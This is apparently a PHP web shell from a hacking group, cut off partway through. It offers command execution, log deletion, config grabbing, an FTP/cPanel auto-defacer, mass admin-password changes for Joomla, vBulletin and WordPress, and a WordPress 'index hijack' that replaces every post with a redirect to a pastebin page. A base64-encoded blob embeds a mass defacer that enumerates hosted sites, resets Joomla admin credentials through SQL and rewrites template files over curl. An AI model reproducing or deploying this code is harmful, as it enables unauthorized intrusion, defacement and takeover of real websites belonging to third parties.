<a href="?action=joomla">&nbsp;Mass Change Admin Joomla&nbsp;</a><br><br>
<a href="?action=vb">&nbsp;Mass Change Admin vBulletin&nbsp;</a><br><br>
<a href="?action=wp">&nbsp;Mass Change Admin Mass WordPress&nbsp;</a><br><br>
<a href="?action=wpandjmlamassdfce">&nbsp;Wordpress & Joomla Mass Deface&nbsp;</a><br><br>
<a href="?action=wrdprshtmlinj">&nbsp;Wordpress Hijack Index Priv8&nbsp;</a><br><br>
<a href="?action=cpnlndftpotdfr">&nbsp;Cpanel & Ftp Auto Defacer&nbsp;</a><br><br>
<a href="?action=srvrinformations">&nbsp;Server Infos&nbsp;</a>
<a href="?action=deltlogss">&nbsp;Logs&nbsp;</a>
<a href="?action=about">&nbsp;About&nbsp;</a>

</center>
</b>

</div><br>

<?php
/*
	By: The Cybers Team
	Versão: Beta 1.0
	[ok] listar
	[ok] visualizar
	[ok] download
	[ok] editar
	[ok] deletar
	[ok] Server Info
	[ok] Command Execute
	[ok] Ip Lookup Domain
	[ok] Find Directory Writable/Readable
	[ok] Remove LOG
	[ok] Config Grabber
	[ok] Mass Deface Dirs
	[ok] Mass Change Admin Joomla
	[ok] Mass Change Admin vBulletin
	[ok] Mass Change Admin Mass WordPress
	[ok] Wordpress & Joomla Mass Deface
	[ok] Wordpress Hijack Index Priv8
	[ok] Cpanel & Ftp Auto Defacer
*/
	// Funções =======================================================

// cpanel e auto FTP defacer

if(isset($_GET['action']) && $_GET['action'] == 'cpnlndftpotdfr'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin Mass WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<br><center><span style="font-size:30px; font-family:Fredericka the Great">Cpanel & Ftp Auto Defacer</span><br>TheCybersTeam</center><br><center><img src="http://i.imgur.com/50bOEFV.png" /></center>';
echo"<table width='100%' cellspacing='0' cellpadding='0' class='tb1' >
<td width='100%' align=center valign='top' rowspan='1'><div class='hedr'> 
<td height='10' align='left' class='td1'></td></tr><tr><td 
width='100%' align='center' valign='top' rowspan='1'>
<font color='red' face='comic sans ms' size='1'><b> 
<font color='RED' face='gothic' size='3'></font><br>
<font color='white'></font>
</table>";
 
echo"<body bgcolor=black><h6 style='text-align:center'><font color=white>
<form method=post><font face=Tahoma size=2 color=#007700>
Server ip : &nbsp;<input type=text name=hi value=ip>&nbsp;
Username : &nbsp;<input type=text name=tx value=>&nbsp;
Password : &nbsp;<input type=text name=p value=><br><br>
file that you want to deface : </font><input type=text name=ph value='index.php'><br><br>
<font face=Tahoma size=2>Deface page url --> </font><textarea class='area' rows='1' cols='75' name='deface' value='your daface page link'></textarea><br><br>
<input type=submit name=sm value='Kill it Now' /><br>
</form>";

if(isset($_POST['sm']))
{
$ip=trim($_POST['hi']);
$u=trim($_POST['tx']);
$p=trim($_POST['p']);
$d=trim($_POST['ph']);
$df=trim($_POST['deface']);
echo "<br><font color=white size=2>";
echo "<font color=red size=3>server ip ==></font>&nbsp".$ip;
echo "<br><font color=red size=3>user ==></font> &nbsp".$u;
echo "<br><font color=red size=3>password ==></font> &nbsp".$p;
echo "<br><font color=red size=3>dirctory ==></font> &nbsp".$d;
echo "<br><font color=red size=3>deface link ==></font><br>".$df."<br>";
$dl="public_html/".$d;
$si= ftp_connect($ip);

$try= ftp_login($si,$u,$p);
if ((!$si) || (!$try))
{
echo "<br>could not connect , hope u filled out all correctly :(";
exit;
}
else
{
echo "<br>connection done XD<br>its time to spin this shit<br>";
}
$deface = ftp_put($si, $dl , $df, FTP_BINARY);
if ($deface)
{
echo "got defaced successfully >";
}
else
{
echo "try manually :(";
}
}
}



// wordpress hijacked

if(isset($_GET['action']) && $_GET['action'] == 'wrdprshtmlinj'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
echo '<form method="POST">
<br><center><span style="font-size:30px; font-family:Fredericka the Great">Wordpress Index Hijack Priv8</span></center><br>
<p align="center"> 
<img src="http://i.imgur.com/50bOEFV.png" /></p>

<br><center><font color="#FF0000" size="2" face="orion">TheCybersTeam</font></center><br>
<center><input type="text" value="localhost" name="pghost">
<input type="text" value="database_name" name="dbnmn">
<input type="text" value="prefix" name="prefix">
<input type="text" value="username_db" name="dbusrrrr">
<input type="text" value="password_db" name="pwddbbn"></center><br>
<center><textarea class="area" name="pown" cols="100" rows="7"><meta http-equiv="refresh" content="0;URL=http://pastebin.com/raw/z2vdCWmb"></textarea><br><br>
<input type="submit" name="up2" value="Hijack Index"><br></center><form>';
$pghost = $_POST['pghost'];
$dbnmn = $_POST['dbnmn'];
$dbusrrrr = $_POST['dbusrrrr'];
$pwddbbn = $_POST['pwddbbn'];
$index = stripslashes($_POST['pown']);
$prefix = $_POST['prefix'];
//$prefix = "wp_";
if ($_POST['up2']) {
@mysql_connect($pghost, $dbusrrrr, $pwddbbn) or die(mysql_error());
@mysql_select_db($dbnmn) or die(mysql_error());
$tableName = $prefix . "posts";
$ghost1 = mysql_query("UPDATE $tableName SET post_title ='" . $index . "' WHERE ID > 0 ");
if (!$ghost1) {
$ghost2 = mysql_query("UPDATE $tableName SET post_content ='" . $index . "' WHERE ID > 0 ");
} elseif (!$ghost2) {
$ghost3 = mysql_query("UPDATE $tableName SET post_name ='" . $index . "' WHERE ID > 0 ");
}
mysql_close();
if ($ghost1 || $ghost2 || $ghost3) {
echo "<center><p><b><font color='red'>Index Website Have been Hijacked Successfully</font></p></b></center>";
} else {
echo "<center><p><b><font color='red'>Failed To Hijack the Website :(</font></p></b></center>";
}
}
}



// Wordpress & Joomla Mass Deface

if(isset($_GET['action']) && $_GET['action'] == 'wpandjmlamassdfce'){
echo '<center><b class="conte">
<a href="?action=mass">Mass Deface Dirs</a> -
<a href="?action=joomla">Mass Change Admin Joomla</a> -
<a href="?action=vb">Mass Change Admin vBulletin</a> -
<a href="?action=wp">Mass Change Admin WordPress</a> -
<a href="?action=wpandjmlamassdfce">Wordpress & Joomla Mass Deface</a> -
<a href="?action=wrdprshtmlinj">Wordpress Index Hijack Priv8</a> -
<a href="?action=cpnlndftpotdfr">Cpanel & Ftp Auto Defacer</a> </center>
</b>';
//extract script
$gfgf4fff = 'PD9waHANCi8qDQpXb3JkcHJlc3MgJiBKb29tbGEgTWFzcyBEZWZhY2VyIFYyDQpOb3QgQ29kZWQgQnkgQW5vbkdob3N0T2ZmaWNpYWwgLCBidXQgb25seSB0aGUgZGVzaWduDQpmYWNlYm9vayA6IC9Bbm9uR2hvc3RPZmZpY2lhbDINCg0KdGhpcyB2ZXJzaW9uIHVzZXMgdHdvIG1ldGhvZHMgZm9yIGdldHRpbmcgc2l0ZXMgJiB1c2VycyAmIGNvbmZpZyBmaWxlDQpbK10gdGhlIGZpcnN0IG1ldGhvZCBpcyBnZXR0aW5nIGV2ZXJ5dGhpbmcgYWJvdXQgdGhlIGRvbWFpbiBmcm9tICggL2V0Yy9uYW1lZC5jb25mICkgLCBhbmQgZGVmYWNpbmcNClsrXSB0aGUgc2Vjb25kIG1ldGhvZCBpcyBnZXR0aW5nIHNpdGVzIG5hbWVzIGZyb20gKCAvdmFyL25hbWVkICkgLCB0aGVuIGNvbGxlY3RpbmcgdXNlcm5hbWVzIG5hZCBkZWZhY2luZw0KDQpkb24ndCB3b3JyeSBhYm91dCB0aGUgYmFzZTY0IGVuY3J5cHRpb24gaW4gbGluZXMgMjAgYW5kIDI1ICwganVzdCB0aGUgc3R5bGUgLCBhbmQgdGhlIHNjcmlwdCBuYW1lDQp5b3UgY2FuIGRlY29kZSBhbmQgY2hlY2sgdGhlbSBpZiB5b3UgZG9uJ3QgdHJ1c3QgbWUgOykNCiovDQplY2hvICcNCjxodG1sPg0KPC9oZWFkPg0KPHRpdGxlPkFub25HaG9zdCAgOiBXb3JkcHJlc3MgJiBKb29tbGEgTWFzcyBEZWZhY2VyPC90aXRsZT4NCjxsaW5rIGhyZWY9Imh0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PU9yYml0cm9uOjcwMCIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+DQo8Y2VudGVyPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCnRhYmxlLGJvZHkgew0KYmFja2dyb3VuZC1pbWFnZTogdXJsKCJodHRwOi8vaW1nMTUuaG9zdGluZ3BpY3MubmV0L3BpY3MvMTE1ODMwdGxjaGFyZ2VtZW50LnBuZyIpOw0KYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCmJhY2tncm91bmQtcG9zaXRpb246IGNlbnRlcjsNCmNvbG9yOmJsYWNrOw0KZm9udC1mYW1pbHk6ICJUcmVidWNoZXQgTVMiLEFyaWFsO2JhY2tncm91bmQtYXR0YWNobWVudDpmaXhlZDttYXJnaW46MDtwYWRkaW5nOjA7fQ0KLmhlYWRlciB7cG9zaXRpb246Zml4ZWQ7d2lkdGg6MTAwJTt0b3A6MDtiYWNrZ3JvdW5kOiMwMDA7fQ0KLmZvb3RlciB7cG9zaXRpb246Zml4ZWQ7d2lkdGg6MTAwJTtib3R0b206MDtiYWNrZ3JvdW5kOiMwMDA7fQ0KaW5wdXRbdHlwZT0ic3VibWl0Il17YmFja2dyb3VuZC1jb2xvcjpyZ2JhKDI1LDI1LDI1LDAuNik7Ym9yZGVyOjE7IHBhZGRpbmc6MnB4OyBmb250LXNpemU6MjVweDtmb250LWZhbWlseTpvcmJpdHJvbjsgY29sb3I6cmVkO2JvcmRlcjoycHggc29saWQgd2hpdGU7bWFyZ2luOjRweCA0cHggOHB4IDA7fQ0KaW5wdXRbdHlwZT0ic3VibWl0Il06aG92ZXJ7Y29sb3I6U2VhU2hlbGw7fQ0KaW5wdXRbdHlwZT0idGV4dCJdOmhvdmVye2JhY2tncm91bmQ6IzIyMjIyMjt9DQppbnB1dFt0eXBlPSJyYWRpbyJde21hcmdpbi10b3A6IDA7fQ0KLnRkMiB7Ym9yZGVyLWxlZnQ6MXB4IHNvbGlkIHJlZDtib3JkZXItcmFkaXVzOiAycHggMnB4IDJweCAycHg7fQ0KaW5wdXRbdHlwZT0idGV4dCJdIHtvdXRsaW5lOm5vbmU7dHJhbnNpdGlvbjogYWxsIDAuMjBzIGVhc2UtaW4tb3V0Oy13ZWJraXQtdHJhbnNpdGlvbjogYWxsIDAuMjBzIGVhc2UtaW4tb3V0Oy1tb3otdHJhbnNpdGlvbjogYWxsIDAuMjBzIGVhc2UtaW4tb3V0Oy1tb3otYm9yZGVyLXJhZGl1czogNnB4OyBib3JkZXItcmFkaXVzOiAxMnB4O2JhY2tncm91bmQ6IzExMTExMTsgYm9yZGVyOjE7IHBhZGRpbmc6MnB4OyBmb250LWZhbWlseTpvcmJpdHJvbjsgZm9udC1zaXplOjE1cHg7IGNvbG9yOiNmZmZmZmY7Ym9yZGVyOjJweCBzb2xpZCAjNEM4M0FGO21hcmdpbjo0cHggNHB4IDhweCAwO30NCi5ldmVuIHtiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDI1LCAyNSwgMjUsIDAuNik7fQ0KLm9kZCB7YmFja2dyb3VuZC1jb2xvcjogcmdiYSgxMDIsIDEwMiwgMTAyLCAwLjYpO30NCmEge2NvbG9yOiNmZmY7fSBhOmhvdmVyIHtjb2xvcjpyZWQ7fQ0KZmllbGRzZXR7Ym9yZGVyOiAxcHggc29saWQgZ3JleTsgYmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjcpOyB3aWR0aDogNjAwcHg7IG1hcmdpbjogMCBhdXRvO21pbi1oZWlnaHQ6MjQwcHg7fQ0KdGV4dGFyZWF7YmFja2dyb3VuZDogcmdiYSgwLDAsMCwwLjYpOyBjb2xvcjogd2hpdGU7fQ0KLmdyZWVuIHtjb2xvcjojMDBGRjAwO2ZvbnQtd2VpZ2h0OmJvbGQ7fQ0KLnJlZCB7Y29sb3I6I0ZGMDAwMDtmb250LXdlaWdodDpib2xkO30NCi5raWxsbWUge2ZvbnQtZmFtaWx5Om9yYml0cm9uO3Bvc2l0aW9uOiBmaXhlZDsgdG9wOiAyMHB4OyByaWdodDogMjBweDsgYm9yZGVyOiAycHggc29saWQgIzRDODNBRjsgcGFkZGluZzogMTBweDsgZm9udC1zaXplOiAyMHB4OyBjb2xvcjogd2hpdGU7IGZvbnQtd2VpZ2h0OiBib2xkO30NCiANCi5yZXN1bHQge2JvcmRlcjoycHggc29saWQgIzRDODNBRjstbW96LWJvcmRlci1yYWRpdXM6MTBweDtib3JkZXItcmFkaXVzOjEwcHg7fSANCg0KPC9zdHlsZT4NCiA8Y2VudGVyPjxoMT5Bbm9uR2hvc3QgV29yZHByZXNzICYgSm9vbWxhIE1hc3MgRGVmYWNlciA8L2gxPjwvY2VudGVyPg0KIDwvaGVhZD4NCiA8Ym9keT4nOw0KDQoNCi8vIGdldHRpbmcgaW5mbyBmcm9tIGluc2lkZSA6KQ0KZnVuY3Rpb24gdHVuaXNpYSgkdGV4dCwkYmlkZXlhLCRuaWhleWEsJGk9MSl7DQogICAgJGFyMD1leHBsb2RlKCRiaWRleWEsICR0ZXh0KTsNCiAgICAkYXIxPWV4cGxvZGUoJG5paGV5YSwgJGFyMFskaV0pOw0KICAgIHJldHVybiB0cmltKCRhcjFbMF0pOw0KfQ0KDQpmdW5jdGlvbiByYW5kb210KCkgew0KICAgICRjaGFycyA9ICJhYmNkZWZnaGlqa21ub3BxcnN0dXZ3eHl6MDIzNDU2Nzg5IjsNCiAgICBzcmFuZCgoZG91YmxlKW1pY3JvdGltZSgpKjEwMDAwMDApOw0KICAgICRpID0gMDsNCiAgICAkcGFzcyA9ICcnOw0KICAgIHdoaWxlICgkaSA8PSA3KSB7DQogICAgICAgICRudW0gPSByYW5kKCkgJSAzMzsNCiAgICAgICAgJHRtcCA9IHN1YnN0cigkY2hhcnMsICRudW0sIDEpOw0KICAgICAgICAkcGFzcyA9ICRwYXNzIC4gJHRtcDsNCiAgICAgICAgJGkrKzsNCiAgICB9DQogICAgcmV0dXJuICRwYXNzOw0KfQ0KDQovLyBqb29tbGEgaW5kZXggY2hhbmdlcg0KZnVuY3Rpb24gaW5kZXhfY2hhbmdlcl9qb29tbGEoJGNvbmYsICRpbmRleF9zaXRlLCAkZG9tYWluKSB7DQoNCiRjb250ZW50ID0gZmlsZV9nZXRfY29udGVudHMoJGluZGV4X3NpdGUpOw0KICAgICRkb2xlciA9ICckJzsNCiAgICAkdXNlcm5hbWUgPSB0dW5pc2lhKCRjb25mLCAkZG9sZXIuInVzZXIgPSAnIiwgIic7Iik7DQogICAgJHBhc3N3b3JkID0gdHVuaXNpYSgkY29uZiwgJGRvbGVyLiJwYXNzd29yZCA9ICciLCAiJzsiKTsNCiAgICAkZGJuYW1lID0gdHVuaXNpYSgkY29uZiwgJGRvbGVyLiJkYiA9ICciLCAiJzsiKTsNCiAgICAkcHJlZml4ID0gdHVuaXNpYSgkY29uZiwgJGRvbGVyLiJkYnByZWZpeCA9ICciLCAiJzsiKTsNCiAgICAkaG9zdCA9IHR1bmlzaWEoJGNvbmYsICRkb2xlci4iaG9zdCA9ICciLCInOyIpOw0KICAgICRjbz1yYW5kb210KCk7DQogICAgJHNpdGVfdXJsID0gImh0dHA6Ly8iLiRkb21haW4uIi9hZG1pbmlzdHJhdG9yIjsNCiAgICAkb3V0cHV0ID0gJyc7DQogICAgJGNvbmQgPSAwOyANCiAgICAkbGluaz1teXNxbF9jb25uZWN0KCRob3N0LCAkdXNlcm5hbWUsICRwYXNzd29yZCk7DQogICAgaWYoJGxpbmspIHsNCiAgICAgICAgbXlzcWxfc2VsZWN0X2RiKCRkYm5hbWUsJGxpbmspIDsNCiAgICAgICAgJHJlcTEgPSBteXNxbF9xdWVyeSgiVVBEQVRFIGAiLiRwcmVmaXguInVzZXJzYCBTRVQgYHVzZXJuYW1lYCA9J2FkbWluJyAsIGBwYXNzd29yZGAgPSAnNDI5N2Y0NGIxMzk1NTIzNTI0NWIyNDk3Mzk5ZDdhOTMnLCBgdXNlcnR5cGVgID0gJ1N1cGVyIEFkbWluaXN0cmF0b3InLCBgYmxvY2tgID0gMCIpOw0KICAgICAgICAkcmVxID0gbXlzcWxfbnVtcm93cyhteXNxbF9xdWVyeSgiU0hPVyBUQUJMRVMgTElLRSAnIi4kcHJlZml4LiJleHRlbnNpb25zJyIpKTsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkb3V0cHV0Lj0gIlstXSBEQiBFcnJvcjxiciAvPiI7DQogICAgfQ0KICAgIA0KICAgIGlmKCRyZXExKXsNCiAgICAgICAgaWYgKCRyZXEpIHsNCiRyZXEgPSBteXNxbF9xdWVyeSgiU0VMRUNUICogZnJvbSAgYCIuJHByZWZpeC4idGVtcGxhdGVfc3R5bGVzYCBXSEVSRSBgY2xpZW50X2lkYCA9ICcwJyBhbmQgYGhvbWVgID0gJzEnIik7DQokZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KJHRlbXBsYXRlX25hbWUgPSAkZGF0YVsidGVtcGxhdGUiXTsNCg0KJHJlcSA9IG15c3FsX3F1ZXJ5KCJTRUxFQ1QgKiBmcm9tICBgIi4kcHJlZml4LiJleHRlbnNpb25zYCBXSEVSRSBgbmFtZWA9JyIuJHRlbXBsYXRlX25hbWUuIicgb3IgYGVsZW1lbnRgID0gJyIuJHRlbXBsYXRlX25hbWUuIiciKTsNCiRkYXRhID0gbXlzcWxfZmV0Y2hfYXJyYXkoJHJlcSk7DQokdGVtcGxhdGVfaWQgPSAkZGF0YVsiZXh0ZW5zaW9uX2lkIl07DQoNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocCI7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KJHJldHVybiA9IHR1bmlzaWEoJGJ1ZmZlciAsJzxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InJldHVybiIgdmFsdWU9IicsJyInKTsNCiRoaWRkZW4gPSB0dW5pc2lhKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsNCk7DQoNCmlmKCRyZXR1cm4gJiYgJGhpZGRlbikgew0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1JFRkVSRVIsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9QT1NURklFTERTLCAidXNlcm5hbWU9YWRtaW4mcGFzc3dkPTEyMzEyMyZvcHRpb249Y29tX2xvZ2luJnRhc2s9bG9naW4mcmV0dXJuPSIuJHJldHVybi4iJiIuJGhpZGRlbi4iPTEiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KJHBvcyA9IHN0cnBvcygkYnVmZmVyLCJjb21fY29uZmlnIik7DQppZigkcG9zID09PSBmYWxzZSkgew0KJG91dHB1dC49ICJbLV0gTG9naW4gRXJyb3I8YnIgLz4iOw0KfSBlbHNlIHsNCiRvdXRwdXQuPSAiWytdIExvZ2luIFN1Y2Nlc3NmdWw8YnIgLz4iOw0KfQ0KfQ0KaWYoJHBvcyl7DQokdXJsMj0kc2l0ZV91cmwuIi9pbmRleC5waHA/b3B0aW9uPWNvbV90ZW1wbGF0ZXMmdGFzaz1zb3VyY2UuZWRpdCZpZD0iLmJhc2U2NF9lbmNvZGUoJHRlbXBsYXRlX2lkLiI6aW5kZXgucGhwIik7DQokY2ggPSBjdXJsX2luaXQoKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VUkwsICR1cmwyKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KDQokaGlkZGVuMj10dW5pc2lhKCRidWZmZXIgLCc8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSInLCciIHZhbHVlPSIxIicsMik7DQppZigkaGlkZGVuMikgew0KJG91dHB1dC49ICJbK10gaW5kZXgucGhwIGZpbGUgZm91bmQgaW4gVGhlbWUgRWRpdG9yPGJyIC8+IjsNCn0gZWxzZSB7DQokb3V0cHV0Lj0gIlstXSBpbmRleC5waHAgTm90IGZvdW5kIGluIFRoZW1lIEVkaXRvcjxiciAvPiI7DQp9DQp9DQppZigkaGlkZGVuMikgew0KJHVybDI9JHNpdGVfdXJsLiIvaW5kZXgucGhwP29wdGlvbj1jb21fdGVtcGxhdGVzJmxheW91dD1lZGl0IjsNCiRjaCA9IGN1cmxfaW5pdCgpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1QsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1BPU1RGSUVMRFMsImpmb3JtW3NvdXJjZV09Ii4kY29udGVudC4iJmpmb3JtW2ZpbGVuYW1lXT1pbmRleC5waHAmamZvcm1bZXh0ZW5zaW9uX2lkXT0iLiR0ZW1wbGF0ZV9pZC4iJiIuJGhpZGRlbjIuIj0xJnRhc2s9c291cmNlLnNhdmUiKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIDEpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0hFQURFUiwgMCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVNFUkFHRU5ULCAkdXNlcmFnZW50KTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVKQVIsICRjbyk7IA0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUZJTEUsICRjbyk7IA0KJGJ1ZmZlciA9IGN1cmxfZXhlYygkY2gpOw0KY3VybF9jbG9zZSgkY2gpOw0KDQokcG9zID0gc3RycG9zKCRidWZmZXIsJzxkZCBjbGFzcz0ibWVzc2FnZSBtZXNzYWdlIj4nKTsNCiRjb25kID0gMDsNCmlmKCRwb3MgPT09IGZhbHNlKSB7DQokb3V0cHV0Lj0gIlstXSBVcGRhdGluZyBJbmRleC5waHAgRXJyb3I8YnIgLz4iOw0KICAgDQp9IGVsc2Ugew0KJG91dHB1dC49ICJbK10gSW5kZXgucGhwIFRlbXBsYXRlIHN1Y2Nlc3NmdWxseSBzYXZlZDxiciAvPiI7DQokY29uZCA9IDE7DQp9DQp9DQogICAgICAgIH0gDQogICAgICAgIGVsc2Ugew0KJHJlcSA9bXlzcWxfcXVlcnkoIlNFTEVDVCAqIGZyb20gIGAiLiRwcmVmaXguInRlbXBsYXRlc19tZW51YCBXSEVSRSBjbGllbnRfaWQ9JzAnIik7DQokZGF0YSA9IG15c3FsX2ZldGNoX2FycmF5KCRyZXEpOw0KJHRlbXBsYXRlX25hbWU9JGRhdGFbInRlbXBsYXRlIl07DQokdXNlcmFnZW50PSJNb3ppbGxhLzQuMCAoY29tcGF0aWJsZTsgTVNJRSA3LjBiOyBXaW5kb3dzIE5UIDUuMTsgLk5FVCBDTFIgMS4xLjQzMjI7IEFsZXhhIFRvb2xiYXI7IC5ORVQgQ0xSIDIuMC41MDcyNykiOw0KJHVybDI9JHNpdGVfdXJsLiIvaW5kZXgucGhwIjsNCiRjaCA9IGN1cmxfaW5pdCgpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VSTCwgJHVybDIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT05ORUNUVElNRU9VVCwgMTApOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1VTRVJBR0VOVCwgJHVzZXJhZ2VudCk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFSkFSLCAkY28pOyANCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9DT09LSUVGSUxFLCAkY28pOyANCiRidWZmZXIgPSBjdXJsX2V4ZWMoJGNoKTsNCiRoaWRkZW49dHVuaXNpYSgkYnVmZmVyICwnPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iJywnIiB2YWx1ZT0iMSInLDMpOw0KDQppZigkaGlkZGVuKSB7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsMik7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVCwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUE9TVEZJRUxEUywidXNlcm5hbWU9YWRtaW4mcGFzc3dkPTEyMzQ1NiZvcHRpb249Y29tX2xvZ2luJnRhc2s9bG9naW4mIi4kaGlkZGVuLiI9MSIpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0ZPTExPV0xPQ0FUSU9OLCAxKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgMSk7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCAwKTsNCmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9VU0VSQUdFTlQsICR1c2VyYWdlbnQpOw0KY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX0NPT0tJRUpBUiwgJGNvKTsgDQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfQ09PS0lFRklMRSwgJGNvKTsgDQokYnVmZmVyID0gY3VybF9leGVjKCRjaCk7DQokcG9zID0gc3RycG9zKCRidWZmZXIsImNvbV9jb25maWciKTsNCmlmKCRwb3MgPT09IGZhbHNlKSB7DQokb3V0cHV0Lj0gIlstXSBMb2dpbiBFcnJvcjxiciAvPiI7DQp9IGVsc2Ugew0KJG91dHB1dC49ICJbK10gTG9naW4gU3VjY2Vzc2Z1bDxiciAvPiI7DQp9DQp9DQoNCmlmKCRwb3MpIHsNCiR1cmwyPSRzaXRlX3VybC4iL2luZGV4LnBocD9vcHRpb249Y29tX3RlbXBsYXRlcyZ0YXNrPWVkaXRfc291cmNlJmNsaWVudD0wJmlkPSIuJHRlbXBsYXRlX25hbWU7DQpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAk